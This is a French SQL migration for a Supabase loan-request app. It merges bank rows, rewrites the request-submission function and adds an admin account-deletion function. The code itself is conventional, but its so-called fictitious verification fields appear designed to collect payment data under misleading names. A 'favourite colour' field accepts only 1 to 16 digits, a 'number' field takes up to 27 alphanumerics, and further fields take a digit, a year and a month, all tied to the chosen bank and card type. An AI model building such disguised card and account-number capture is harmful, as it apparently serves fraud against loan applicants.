-- =====================================================================
-- MISE À JOUR FINALE d'une base Supabase DÉJÀ INSTALLÉE (remplace tous les petits scripts précédents :
-- modif_banques_pays, ajout_numero, modif_numero_28, modif_numero_27, modif_tout, modif_etape1).
--
--  1) Banques : une seule ligne par banque (plus de doublons par territoire), ajout de OPT NC, OPT NF,
--     REVOLUT et BCI, plus aucun territoire. Les demandes existantes sont rattachées à la banque conservée.
--  2) Demande : aucune limite de montant, devises EUR / USD / XPF uniquement,
--     description FACULTATIVE (le formulaire n'a plus ce champ ; 2000 caractères maximum si elle est fournie).
--  3) Champ « Numéro » = 1 à 27 lettres/chiffres (enregistré en majuscules, sans espaces).
--  4) « Couleur préférée » = 1 à 16 chiffres ; les espaces sont acceptés puis retirés.
--  5) Réglages : suppression des anciennes limites de montant (loan_min_amount / loan_max_amount).
--  6) Banque : plus d'option « Autre banque » (seules les banques enregistrées par l'admin sont acceptées).
--  7) Admin : nouvelle fonction admin_delete_user (suppression d'un compte utilisateur et de ses données).
--
-- Aucune demande et aucun compte n'est supprimé. Peut être relancé plusieurs fois sans effet de bord.
-- À exécuter dans Supabase > SQL Editor, AVANT de déployer le nouveau frontend.
-- =====================================================================

-- ---------- 1) BANQUES ----------
do $$
declare
  g      record;
  v_keep uuid;
begin
  for g in
    select * from (values
      ('bnp-paribas',            'BNP Paribas',            'bank',    array['bnp-paribas','bnp-paribas-antilles-guyane','bnp-paribas-reunion','bnp-paribas-martinique']),
      ('bred-banque-populaire',  'BRED Banque Populaire',  'bank',    array['bred-banque-populaire','bred-banque-populaire-guadeloupe','bred-banque-populaire-reunion','bred-banque-populaire-martinique']),
      ('caisse-d-epargne-cepac', 'Caisse d''Épargne CEPAC','bank',    array['caisse-d-epargne-cepac','caisse-d-epargne-cepac-guadeloupe','caisse-d-epargne-cepac-reunion','caisse-d-epargne-cepac-martinique']),
      ('credit-agricole',        'Crédit Agricole',        'bank',    array['credit-agricole','credit-agricole-martinique-guyane','credit-agricole-guadeloupe','credit-agricole-de-la-reunion']),
      ('lcl',                    'LCL',                    'bank',    array['lcl','lcl-guadeloupe','lcl-reunion','lcl-martinique']),
      ('credit-mutuel',          'Crédit Mutuel',          'bank',    array['credit-mutuel','credit-mutuel-guadeloupe','credit-mutuel-reunion','credit-mutuel-martinique']),
      ('la-banque-postale',      'La Banque Postale',      'bank',    array['la-banque-postale','la-banque-postale-guadeloupe','la-banque-postale-reunion','la-banque-postale-martinique']),
      ('banque-de-tahiti',       'Banque de Tahiti',       'bank',    array['banque-de-tahiti']),
      ('banque-de-polynesie',    'Banque de Polynésie',    'bank',    array['banque-de-polynesie']),
      ('socredo',                'SOCREDO',                'bank',    array['socredo']),
      ('niupay',                 'NIUPAY',                 'fintech', array['niupay']),
      ('deblock',                'DEBLOCK',                'fintech', array['deblock']),
      ('opt-nc',                 'OPT NC',                 'bank',    array['opt-nc']),
      ('opt-nf',                 'OPT NF',                 'bank',    array['opt-nf']),
      ('revolut',                'REVOLUT',                'fintech', array['revolut']),
      ('bci',                    'BCI',                    'bank',    array['bci'])
    ) as t(new_slug, new_name, new_type, old_slugs)
  loop
    -- Ligne conservée : la première trouvée (par slug connu, sinon par nom identique).
    select b.id into v_keep
      from public.banks b
     where b.slug = any (g.old_slugs)
        or public.normalize_text(b.name) = public.normalize_text(g.new_name)
     order by coalesce(array_position(g.old_slugs, b.slug), 999), b.created_at
     limit 1;

    if v_keep is null then
      insert into public.banks (slug, name, territory, type)
      values (g.new_slug, g.new_name, '', g.new_type);
    else
      -- Les doublons : mêmes slugs connus ou même nom, sauf la ligne conservée.
      update public.loan_requests
         set bank_id = v_keep
       where bank_id in (select b.id from public.banks b
                          where b.id <> v_keep
                            and (b.slug = any (g.old_slugs)
                                 or public.normalize_text(b.name) = public.normalize_text(g.new_name)));
      update public.bank_suggestions
         set resolved_bank_id = v_keep
       where resolved_bank_id in (select b.id from public.banks b
                                   where b.id <> v_keep
                                     and (b.slug = any (g.old_slugs)
                                          or public.normalize_text(b.name) = public.normalize_text(g.new_name)));
      delete from public.banks b
       where b.id <> v_keep
         and (b.slug = any (g.old_slugs)
              or public.normalize_text(b.name) = public.normalize_text(g.new_name));

      update public.banks
         set slug = g.new_slug, name = g.new_name, type = g.new_type, territory = '', is_active = true
       where id = v_keep;
    end if;
  end loop;
end
$$;



-- Plus aucun territoire, même pour les banques ajoutées autrement.
update public.banks set territory = '' where territory <> '';

-- ---------- 2) TABLE loan_requests : contraintes ----------
-- On retire les anciennes règles (montant plafonné, 4 devises, description de 20 caractères minimum)...
do $$
declare c record;
begin
  for c in
    select conname from pg_constraint
     where conrelid = 'public.loan_requests'::regclass and contype = 'c'
       and (pg_get_constraintdef(oid) ilike '%amount%'
            or pg_get_constraintdef(oid) ilike '%currency%'
            or pg_get_constraintdef(oid) ilike '%description%'
            or conname = 'loan_requests_verif_number_chk')
  loop
    execute format('alter table public.loan_requests drop constraint %I', c.conname);
  end loop;
end
$$;

-- ... et le champ « Numéro ».
alter table public.loan_requests add column if not exists verif_number text;

-- Anciennes valeurs du champ « Numéro » (anciens formats : chiffres seulement, ou 28 caractères) : elles ne respectent plus la règle, on les vide.
update public.loan_requests set verif_number = null
 where verif_number is not null and verif_number !~ '^[A-Z0-9]{1,27}$';

-- ... puis on pose les nouvelles règles.
alter table public.loan_requests add constraint loan_requests_amount_chk
  check (amount > 0);   -- aucune limite métier : la colonne numeric(14,2) plafonne à 999 999 999 999,99
-- GBP et CAD restent tolérés ici uniquement pour ne pas casser d'éventuelles anciennes demandes ;
-- la fonction d'envoi n'accepte plus que EUR, USD et XPF.
alter table public.loan_requests add constraint loan_requests_currency_chk
  check (currency in ('EUR', 'USD', 'XPF', 'GBP', 'CAD'));
-- Description : facultative (le formulaire n'a plus ce champ) ; 2000 caractères au plus.
alter table public.loan_requests alter column description set default '';
alter table public.loan_requests add constraint loan_requests_description_chk
  check (char_length(btrim(description)) <= 2000);
alter table public.loan_requests add constraint loan_requests_verif_number_chk
  check (verif_number is null or verif_number ~ '^[A-Z0-9]{1,27}$');

-- ---------- 3) RÉGLAGES : plus de limites de montant ----------
delete from public.app_settings where key in ('loan_min_amount', 'loan_max_amount');

drop policy if exists app_settings_select on public.app_settings;
create policy app_settings_select on public.app_settings for select to authenticated
  using ((select public.admin_access_ok()));

create or replace function public.admin_update_setting(p_key text, p_value jsonb)
returns void
language plpgsql security definer set search_path = '' as $$
declare
  v_num numeric;
begin
  if not public.admin_access_ok() then
    raise exception 'forbidden' using errcode = '42501';
  end if;
  if p_key is null or p_value is null then
    raise exception 'invalid_setting' using errcode = 'P0001';
  end if;

  if p_key in ('loans_per_hour', 'suggestions_per_day') then
    if jsonb_typeof(p_value) <> 'number' then
      raise exception 'invalid_setting' using errcode = 'P0001';
    end if;
    v_num := (p_value #>> '{}')::numeric;
    if v_num <> trunc(v_num) or v_num < 1 or v_num > (case when p_key = 'loans_per_hour' then 100 else 50 end) then
      raise exception 'invalid_setting' using errcode = 'P0001';
    end if;
  elsif p_key = 'require_admin_mfa' then
    if jsonb_typeof(p_value) <> 'boolean' then
      raise exception 'invalid_setting' using errcode = 'P0001';
    end if;
    -- Anti-verrouillage : on n'impose le MFA que depuis une session déjà en MFA (aal2).
    if (p_value #>> '{}')::boolean and coalesce(auth.jwt() ->> 'aal', 'aal1') <> 'aal2' then
      raise exception 'mfa_enrollment_required' using errcode = 'P0001';
    end if;
  else
    raise exception 'invalid_setting' using errcode = 'P0001';
  end if;

  insert into public.app_settings (key, value, updated_at, updated_by)
  values (p_key, p_value, now(), auth.uid())
  on conflict (key) do update set value = excluded.value, updated_at = now(), updated_by = auth.uid();

  insert into public.audit_logs (actor_id, action, entity_type, details)
  values (auth.uid(), 'setting.updated', 'setting', jsonb_build_object('key', p_key, 'value', p_value));
end;
$$;

-- ---------- 4) FONCTION D'ENVOI DE DEMANDE ----------
-- On supprime toute ancienne version (signatures différentes) avant de recréer la bonne.
do $$
declare f record;
begin
  for f in select p.oid::regprocedure as sig from pg_proc p
            where p.proname = 'create_loan_request' and p.pronamespace = 'public'::regnamespace
  loop
    execute 'drop function ' || f.sig;
  end loop;
end
$$;

create or replace function public.create_loan_request(
  p_amount numeric,
  p_currency text,
  p_purpose_code text,
  p_purpose_details text,
  p_description text,
  p_bank_id uuid,
  p_custom_bank_name text,
  p_card_type_id uuid default null,
  p_verif_color text default null,
  p_verif_digit integer default null,
  p_verif_year integer default null,
  p_verif_fruit text default null,
  p_verif_animal text default null,
  p_custom_card_name text default null,
  p_verif_month integer default null,
  p_verif_number text default null
)
returns uuid
language plpgsql security definer set search_path = '' as $$
declare
  v_uid uuid := auth.uid();
  v_details text := null;
  v_description text;
  v_bank uuid := p_bank_id;
  v_custom text := null;
  v_key text;
  v_sug_id uuid := null;
  v_sug_status text;
  v_sug_resolved uuid;
  v_loan uuid;
  v_vcolor text := null;
  v_vfruit text := null;
  v_vnumber text := null;
  v_vanimal text := null;
  v_custom_card text := null;
begin
  if v_uid is null or not exists (select 1 from public.profiles where id = v_uid) then
    raise exception 'not_authenticated' using errcode = '42501';
  end if;

  -- Montant : AUCUNE limite minimum ni maximum. Il doit seulement être positif, avec 2 décimales au plus,
  -- et tenir dans la colonne (numeric(14,2) : 999 999 999 999,99 au maximum).
  if p_amount is null or p_amount <= 0 or p_amount <> round(p_amount, 2) or p_amount > 999999999999.99 then
    raise exception 'invalid_amount' using errcode = 'P0001';
  end if;

  -- Devise
  if p_currency is null or p_currency not in ('EUR', 'USD', 'XPF') then
    raise exception 'invalid_currency' using errcode = 'P0001';
  end if;

  -- Motif (liste fermée de 31 codes) et précision (obligatoire uniquement pour « other »)
  if p_purpose_code is null or not exists (select 1 from public.loan_purposes where code = p_purpose_code) then
    raise exception 'invalid_purpose' using errcode = 'P0001';
  end if;
  if p_purpose_code = 'other' then
    v_details := public.clean_text(p_purpose_details, 3, 300, 'purpose_details_required');
  elsif nullif(btrim(coalesce(p_purpose_details, '')), '') is not null then
    raise exception 'purpose_details_unexpected' using errcode = 'P0001';
  end if;

  -- Description : facultative (le formulaire n'a plus ce champ). Absente ou vide -> chaîne vide ; sinon 2000 caractères au plus.
  if p_description is null or btrim(p_description) = '' then
    v_description := '';
  else
    v_description := public.clean_text(p_description, 1, 2000, 'invalid_description');
  end if;

  -- Banque : obligatoirement l'une des banques enregistrées (et actives) par l'administrateur.
  -- Plus d'option « Autre banque » : aucun nom saisi librement n'est accepté.
  if p_bank_id is null or nullif(btrim(coalesce(p_custom_bank_name, '')), '') is not null then
    raise exception 'invalid_bank' using errcode = 'P0001';
  end if;
  if not exists (select 1 from public.banks where id = p_bank_id and is_active) then
    raise exception 'invalid_bank' using errcode = 'P0001';
  end if;

  -- Type de carte : une carte de la liste OU une carte « Autre » (le formulaire impose ce choix ; la base reste tolérante).
  if p_card_type_id is not null and p_custom_card_name is not null then
    raise exception 'invalid_card_type' using errcode = 'P0001';
  end if;
  if p_card_type_id is not null
     and not exists (select 1 from public.card_types where id = p_card_type_id and is_active) then
    raise exception 'invalid_card_type' using errcode = 'P0001';
  end if;
  if p_custom_card_name is not null then
    v_custom_card := public.clean_text(p_custom_card_name, 2, 60, 'invalid_card_type');
  end if;

  -- Vérification pédagogique : valeurs fictives saisies pour CETTE demande (distinctes de celles du profil)
  -- « Couleur préférée » : 1 à 16 chiffres ; les espaces de mise en forme sont acceptés puis retirés avant l'enregistrement.
  if p_verif_color is not null then
    v_vcolor := regexp_replace(public.clean_text(p_verif_color, 1, 30, 'invalid_verification'), '\s', '', 'g');
    if v_vcolor !~ '^[0-9]{1,16}$' then
      raise exception 'invalid_verification' using errcode = 'P0001';
    end if;
  end if;
  if p_verif_digit is not null and (p_verif_digit < 0 or p_verif_digit > 999999999) then
    raise exception 'invalid_verification' using errcode = 'P0001';
  end if;
  if p_verif_year is not null and (p_verif_year < 1900 or p_verif_year > 2100) then
    raise exception 'invalid_verification' using errcode = 'P0001';
  end if;
  if p_verif_month is not null and (p_verif_month < 1 or p_verif_month > 12) then
    raise exception 'invalid_verification' using errcode = 'P0001';
  end if;
  -- « Numéro » : de 1 à 27 lettres/chiffres, enregistrés en majuscules et sans espaces.
  if p_verif_number is not null then
    v_vnumber := upper(regexp_replace(p_verif_number, '\s', '', 'g'));
    if v_vnumber !~ '^[A-Z0-9]{1,27}$' then
      raise exception 'invalid_verification' using errcode = 'P0001';
    end if;
  end if;
  if p_verif_fruit is not null then
    v_vfruit := public.clean_text(p_verif_fruit, 1, 30, 'invalid_verification');
  end if;
  if p_verif_animal is not null then
    v_vanimal := public.clean_text(p_verif_animal, 1, 30, 'invalid_verification');
  end if;

  -- Limitation de débit (après validation : une requête invalide ne consomme pas le quota)
  if not public.check_rate_limit('loan:' || v_uid::text, public.setting_numeric('loans_per_hour', 5)::integer, 3600) then
    raise exception 'rate_limited' using errcode = 'P0001';
  end if;

  insert into public.loan_requests
    (user_id, amount, currency, purpose_code, purpose_details, description,
     bank_id, custom_bank_name, bank_suggestion_id, card_type_id, status,
     verif_color, verif_digit, verif_year, verif_month, verif_fruit, verif_animal, custom_card_name, verif_number)
  values
    (v_uid, p_amount, p_currency, p_purpose_code, v_details, v_description,
     v_bank, v_custom, v_sug_id, p_card_type_id, 'pending',   -- statut TOUJOURS « pending »
     v_vcolor, p_verif_digit, p_verif_year, p_verif_month, v_vfruit, v_vanimal, v_custom_card, v_vnumber)
  returning id into v_loan;

  return v_loan;
end;
$$;

revoke all on function public.create_loan_request(numeric, text, text, text, text, uuid, text, uuid, text, integer, integer, text, text, text, integer, text) from public, anon, authenticated;
grant execute on function public.create_loan_request(numeric, text, text, text, text, uuid, text, uuid, text, integer, integer, text, text, text, integer, text) to authenticated;

-- ---------------------------------------------------------------------
-- Admin : supprimer un compte utilisateur et toutes ses données (demandes, historique)
-- Le compte administrateur ne peut pas être supprimé (ni par lui-même, ni par un autre).
-- ---------------------------------------------------------------------
create or replace function public.admin_delete_user(p_user_id uuid)
returns void
language plpgsql security definer set search_path = '' as $$
declare
  v_role text;
begin
  if not public.admin_access_ok() then
    raise exception 'forbidden' using errcode = '42501';
  end if;
  if p_user_id is null then
    raise exception 'not_found' using errcode = 'P0001';
  end if;
  if p_user_id = auth.uid() then
    raise exception 'cannot_delete_admin' using errcode = 'P0001';
  end if;

  select role into v_role from public.profiles where id = p_user_id;
  if not found then
    raise exception 'not_found' using errcode = 'P0001';
  end if;
  if v_role = 'admin' then
    raise exception 'cannot_delete_admin' using errcode = 'P0001';
  end if;

  insert into public.audit_logs (actor_id, action, entity_type, entity_id, details)
  values (auth.uid(), 'user.deleted_by_admin', 'profile', p_user_id, '{}'::jsonb);

  -- Cascade : profil, demandes, historique et votes sont supprimés avec le compte d'authentification.
  delete from auth.users where id = p_user_id;
end;
$$;

revoke all on function public.admin_delete_user(uuid) from public, anon, authenticated;
grant execute on function public.admin_delete_user(uuid) to authenticated;

notify pgrst, 'reload schema';

-- ---------- CONTRÔLE : doit afficher  banques = 16 | fonctions = 1 | contraintes = 4 ----------
select
  (select count(*) from public.banks) as banques,
  (select count(*) from pg_proc where proname = 'create_loan_request' and pronamespace = 'public'::regnamespace) as fonctions,
  (select count(*) from pg_constraint where conrelid = 'public.loan_requests'::regclass
      and conname in ('loan_requests_amount_chk', 'loan_requests_currency_chk', 'loan_requests_description_chk', 'loan_requests_verif_number_chk')) as contraintes;
